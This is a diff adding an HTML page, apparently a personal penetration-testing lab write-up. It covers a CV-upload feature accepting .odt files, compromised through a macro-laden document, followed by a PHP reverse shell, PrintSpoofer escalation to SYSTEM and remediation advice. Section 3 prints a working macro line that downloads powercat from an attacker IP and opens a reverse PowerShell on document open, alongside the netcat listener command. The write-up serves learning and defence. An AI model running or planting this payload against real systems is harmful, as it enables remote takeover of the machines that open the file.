@@ -1,0 +1,300 @@
+<!DOCTYPE html>
+<html lang="en" class="scroll-smooth">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>OffSec Lab Craft Report | Josh Chalabi</title>
+    <!-- Tailwind CSS -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <!-- FontAwesome -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <!-- Google Fonts -->
+    <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@300;400;600&family=Share+Tech+Mono&display=swap" rel="stylesheet">
+    
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    colors: {
+                        'cyber-black': '#0b1020',
+                        'cyber-gray': '#0f1733',
+                        'cyber-green': '#5eead4',
+                        'cyber-green-dim': 'rgba(94, 234, 212, 0.1)',
+                        'cyber-purple': '#a78bfa',
+                        'cyber-red': '#ff003c',
+                    },
+                    fontFamily: {
+                        mono: ['"Fira Code"', 'monospace'],
+                        tech: ['"Share Tech Mono"', 'monospace'],
+                    },
+                    boxShadow: {
+                        'neon': '0 0 10px rgba(94, 234, 212, 0.5), 0 0 20px rgba(94, 234, 212, 0.3)',
+                    }
+                }
+            }
+        }
+    </script>
+    <style>
+        ::-webkit-scrollbar { width: 8px; }
+        ::-webkit-scrollbar-track { background: #0b1020; }
+        ::-webkit-scrollbar-thumb { background: #23305f; border-radius: 4px; }
+        ::-webkit-scrollbar-thumb:hover { background: #5eead4; }
+        .bg-grid {
+            background-size: 40px 40px;
+            background-image: linear-gradient(to right, rgba(94, 234, 212, 0.05) 1px, transparent 1px),
+                              linear-gradient(to bottom, rgba(167, 139, 250, 0.05) 1px, transparent 1px);
+        }
+    </style>
+</head>
+<body class="bg-cyber-black text-gray-300 font-mono relative overflow-x-hidden min-h-screen flex flex-col">
+
+    <!-- Background Overlay -->
+    <div class="fixed inset-0 bg-grid pointer-events-none z-0"></div>
+
+    <!-- Navbar -->
+    <nav class="fixed w-full z-50 bg-cyber-black/90 backdrop-blur-md border-b border-[#23305f]">
+        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
+            <div class="flex items-center justify-between h-16">
+                <div class="flex-shrink-0">
+                    <a href="index.html" class="text-2xl font-bold text-cyber-green font-tech tracking-wider">&lt;josh/&gt;</a>
+                </div>
+                <div>
+                    <a href="reports.html" class="flex items-center text-gray-300 hover:text-white transition-colors">
+                        <i class="fas fa-arrow-left mr-2"></i> Back to Reports
+                    </a>
+                </div>
+            </div>
+        </div>
+    </nav>
+
+    <!-- Main Content -->
+    <main class="relative z-10 pt-32 pb-20 max-w-4xl mx-auto px-4 sm:px-6 lg:px-8 flex-grow">
+        
+        <!-- Header Section -->
+        <div class="mb-12 border-b border-[#23305f] pb-8">
+            <h1 class="text-4xl md:text-5xl font-bold text-white mb-4">
+                <span class="text-cyber-green">./</span> OffSec Lab Craft
+            </h1>
+            <div class="flex items-center space-x-4 text-sm text-gray-400">
+                <span class="px-3 py-1 bg-[#1a2342] border border-cyber-green text-cyber-green rounded">Pentest Report</span>
+                <span><i class="far fa-calendar-alt mr-2"></i>Critical Severity</span>
+            </div>
+        </div>
+
+        <!-- Report Content -->
+        <div class="space-y-12">
+
+            <!-- Section 1 -->
+            <section class="bg-cyber-gray border border-[#23305f] rounded-lg p-6 md:p-8 hover:border-cyber-green/50 transition-all">
+                <h2 class="text-2xl font-bold text-white mb-6 border-l-4 border-cyber-green pl-4">1. Overview</h2>
+                <div class="space-y-4">
+                    <p>During the assessment of the target host, a web application running on TCP port 80 was identified. The domain craft.offsec hosted a feature in the "Join Us" section allowing visitors to upload a CV file. The upload mechanism accepted only.odt files.</p>
+                    
+                    <p>Uploading a legitimate .odt file resulted in the message:</p>
+                    
+                    <blockquote class="bg-[#1a2342] border-l-2 border-cyber-purple p-4 text-white italic">
+                        Your resume was submitted, it will be reviewed shortly by our staff.
+                    </blockquote>
+                    
+                    <p>This indicated that the uploaded documents were opened or processed by backend staff or an automated document-handling system, presenting an opportunity for malicious macro execution.</p>
+                </div>
+            </section>
+
+            <!-- Section 2 -->
+            <section class="bg-cyber-gray border border-[#23305f] rounded-lg p-6 md:p-8 hover:border-cyber-green/50 transition-all">
+                <h2 class="text-2xl font-bold text-white mb-6 border-l-4 border-cyber-green pl-4">2. Understanding the ODT Format</h2>
+                <div class="space-y-4">
+                    <p>An ODT (OpenDocument Text) file is the default document format used by LibreOffice and Apache OpenOffice.</p>
+                    
+                    <h3 class="text-lg font-bold text-cyber-purple mt-6 mb-2">Key Characteristics</h3>
+                    <ul class="list-disc list-inside space-y-2 ml-2 text-gray-300">
+                        <li>An ODT file is essentially a ZIP archive.</li>
+                        <li>When extracted, it contains multiple XML files and folders, such as:
+                            <ul class="list-none mt-2 ml-6 space-y-1 text-sm font-mono text-gray-400">
+                                <li><span class="text-cyber-green">content.xml</span> - primary document content</li>
+                                <li><span class="text-cyber-green">styles.xml</span> - formatting</li>
+                                <li><span class="text-cyber-green">meta.xml</span> - metadata</li>
+                                <li><span class="text-cyber-green">Basic/</span> directory for LibreOffice Basic macros</li>
+                                <li><span class="text-cyber-green">META-INF/manifest.xml</span> - manifest including macro registrations</li>
+                            </ul>
+                        </li>
+                    </ul>
+                    <p class="mt-4">LibreOffice supports embedded Basic macros that may execute automatically when the document is opened.</p>
+                </div>
+            </section>
+
+            <!-- Section 3 -->
+            <section class="bg-cyber-gray border border-[#23305f] rounded-lg p-6 md:p-8 hover:border-cyber-green/50 transition-all">
+                <h2 class="text-2xl font-bold text-white mb-6 border-l-4 border-cyber-green pl-4">3. Crafting the Malicious ODT File</h2>
+                <div class="space-y-4">
+                    <p>A malicious document (evilcv.odt) was crafted using LibreOffice.</p>
+                    
+                    <h3 class="text-lg font-bold text-cyber-purple mt-6 mb-2">Steps Performed</h3>
+                    <ol class="list-decimal list-inside space-y-4 ml-2">
+                        <li>A normal ODT document was opened in LibreOffice.</li>
+                        <li>A macro was inserted via:
+                            <div class="mt-2 p-3 bg-[#1a2342] rounded font-mono text-sm text-cyber-green">
+                                3. Tools > Macros > Organize Macros > LibreOffice Basic
+                            </div>
+                        </li>
+                        <li>A new macro module was created containing the following payload:
+                            <div class="mt-2 p-4 bg-black rounded border border-[#23305f] font-mono text-xs md:text-sm text-gray-300 overflow-x-auto">
+                                Shell("cmd /c powershell IEX (New-Object System.Net.Webclient).DownloadString('http://192.168.45.177/powercat.ps1'); powercatc 192.168.45.177 p 4444 -e powershell")
+                            </div>
+                        </li>
+                    </ol>
+
+                    <div class="mt-6">
+                        <p class="mb-2">This macro:</p>
+                        <ul class="list-disc list-inside space-y-1 ml-4 text-gray-400 text-sm">
+                            <li>Executes PowerShell</li>
+                            <li>Downloads powercat.ps1</li>
+                            <li>Initiates a reverse PowerShell session to the attacker's machine</li>
+                        </ul>
+                    </div>
+
+                    <p class="mt-4">The macro was bound to the Open Document event:</p>
+                    <div class="p-3 bg-[#1a2342] rounded font-mono text-sm text-cyber-green">
+                        Tools > Customize > Events > Open Document
+                    </div>
+
+                    <div class="mt-6 space-y-4">
+                        <div>
+                            <p class="mb-2">The attacker hosted powercat.ps1 using:</p>
+                            <code class="block w-full p-3 bg-black border border-[#23305f] rounded text-cyber-red font-mono">python3 -m http.server 80</code>
+                        </div>
+                        <div>
+                            <p class="mb-2">A listener was set up:</p>
+                            <code class="block w-full p-3 bg-black border border-[#23305f] rounded text-cyber-red font-mono">nc -nvlp 4444</code>
+                        </div>
+                    </div>
+
+                    <p class="mt-4">After uploading evilcv.odt a reverse shell was established within ~10-15 seconds.</p>
+                </div>
+            </section>
+
+            <!-- Section 4 -->
+            <section class="bg-cyber-gray border border-[#23305f] rounded-lg p-6 md:p-8 hover:border-cyber-green/50 transition-all">
+                <h2 class="text-2xl font-bold text-white mb-6 border-l-4 border-cyber-green pl-4">4. Initial Shell & User Enumeration</h2>
+                <div class="space-y-4">
+                    <p>Two system accounts were discovered:</p>
+                    <ul class="list-disc list-inside ml-4 font-mono text-cyber-green">
+                        <li>apache</li>
+                        <li>thecybergeek</li>
+                    </ul>
+                    
+                    <p class="mt-4">The web root was located at:</p>
+                    <code class="block w-full p-3 bg-[#1a2342] rounded text-gray-300 font-mono">C:\xampp\htdocs</code>
+                    
+                    <p class="mt-4">A PHP reverse shell was uploaded to this directory, enabling a stable shell as the apache user.</p>
+                </div>
+            </section>
+
+            <!-- Section 5 -->
+            <section class="bg-cyber-gray border border-[#23305f] rounded-lg p-6 md:p-8 hover:border-cyber-green/50 transition-all">
+                <h2 class="text-2xl font-bold text-white mb-6 border-l-4 border-cyber-green pl-4">5. Privilege Escalation via SeImpersonatePrivilege</h2>
+                <div class="space-y-4">
+                    <p>The apache account possessed the following privilege:</p>
+                    <code class="inline-block px-2 py-1 bg-[#1a2342] rounded text-cyber-purple font-mono font-bold">SeImpersonatePrivilege</code>
+                    
+                    <p class="mt-2">This privilege can be exploited to impersonate SYSTEM-level tokens.</p>
+                    
+                    <h3 class="text-lg font-bold text-cyber-purple mt-6 mb-2">Steps Performed</h3>
+                    <ol class="list-decimal list-inside space-y-4 ml-2">
+                        <li>PrintSpoofer executable was uploaded as:
+                            <div class="mt-2 p-2 bg-[#1a2342] rounded font-mono text-sm text-gray-300 inline-block">C:\Windows\Temp\ps.exe</div>
+                        </li>
+                        <li>PrintSpoofer was executed to trigger a SYSTEM-level PowerShell process.</li>
+                        <li>A SYSTEM shell was successfully spawned, resulting in full administrative control.</li>
+                    </ol>
+                </div>
+            </section>
+
+            <!-- Section 6 -->
+            <section class="bg-cyber-gray border border-[#23305f] rounded-lg p-6 md:p-8 hover:border-cyber-green/50 transition-all">
+                <h2 class="text-2xl font-bold text-white mb-6 border-l-4 border-cyber-green pl-4">6. Impact</h2>
+                <div class="space-y-4">
+                    <p>This vulnerability chain allows a remote attacker to achieve:</p>
+                    <ul class="list-disc list-inside space-y-2 ml-2 text-cyber-red">
+                        <li>Remote Code Execution</li>
+                        <li>Web root file upload and execution</li>
+                        <li>SYSTEM-level privilege escalation</li>
+                        <li>Full operating system compromise</li>
+                    </ul>
+                    
+                    <div class="mt-6 p-4 border border-cyber-red bg-red-900/20 rounded flex items-center justify-between">
+                        <span class="font-bold text-white">Severity:</span>
+                        <span class="font-bold text-cyber-red font-mono text-xl">Critical (10.0/10.0)</span>
+                    </div>
+                </div>
+            </section>
+
+            <!-- Section 7 -->
+            <section class="bg-cyber-gray border border-[#23305f] rounded-lg p-6 md:p-8 hover:border-cyber-green/50 transition-all">
+                <h2 class="text-2xl font-bold text-white mb-6 border-l-4 border-cyber-green pl-4">7. Recommendations</h2>
+                <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
+                    
+                    <!-- Short-Term -->
+                    <div>
+                        <h3 class="text-lg font-bold text-cyber-green mb-4 border-b border-[#23305f] pb-2">Short-Term</h3>
+                        <ul class="space-y-3">
+                            <li class="flex items-start">
+                                <i class="fas fa-check text-cyber-green mt-1 mr-3"></i>
+                                <span>Disable macro execution in LibreOffice/OpenOffice</span>
+                            </li>
+                            <li class="flex items-start">
+                                <i class="fas fa-check text-cyber-green mt-1 mr-3"></i>
+                                <span>Avoid opening user-submitted documents directly on server systems</span>
+                            </li>
+                            <li class="flex items-start">
+                                <i class="fas fa-check text-cyber-green mt-1 mr-3"></i>
+                                <span>Implement robust server-side file-type validation</span>
+                            </li>
+                            <li class="flex items-start">
+                                <i class="fas fa-check text-cyber-green mt-1 mr-3"></i>
+                                <span>Use sandbox environments for document processing</span>
+                            </li>
+                        </ul>
+                    </div>
+
+                    <!-- Long-Term -->
+                    <div>
+                        <h3 class="text-lg font-bold text-cyber-purple mb-4 border-b border-[#23305f] pb-2">Long-Term</h3>
+                        <ul class="space-y-3">
+                            <li class="flex items-start">
+                                <i class="fas fa-shield-alt text-cyber-purple mt-1 mr-3"></i>
+                                <span>Apply least-privilege principles on all service accounts</span>
+                            </li>
+                            <li class="flex items-start">
+                                <i class="fas fa-shield-alt text-cyber-purple mt-1 mr-3"></i>
+                                <span>Remove dangerous privileges such as Se ImpersonatePrivilege from non-admin accounts</span>
+                            </li>
+                            <li class="flex items-start">
+                                <i class="fas fa-shield-alt text-cyber-purple mt-1 mr-3"></i>
+                                <span>Harden or isolate document-processing systems</span>
+                            </li>
+                            <li class="flex items-start">
+                                <i class="fas fa-shield-alt text-cyber-purple mt-1 mr-3"></i>
+                                <span>Monitor for suspicious process executions from office document handlers</span>
+                            </li>
+                        </ul>
+                    </div>
+
+                </div>
+            </section>
+
+        </div>
+
+    </main>
+
+    <!-- Footer -->
+    <footer class="bg-black border-t border-[#23305f] py-8 mt-auto relative">
+        <div class="max-w-7xl mx-auto px-4 text-center">
+            <p class="text-gray-600 text-sm font-mono">
+                &copy; 2025 Josh Chalabi. <span class="text-cyber-green">Secure by Design.</span>
+            </p>
+        </div>
+    </footer>
+
+</body>
+</html>
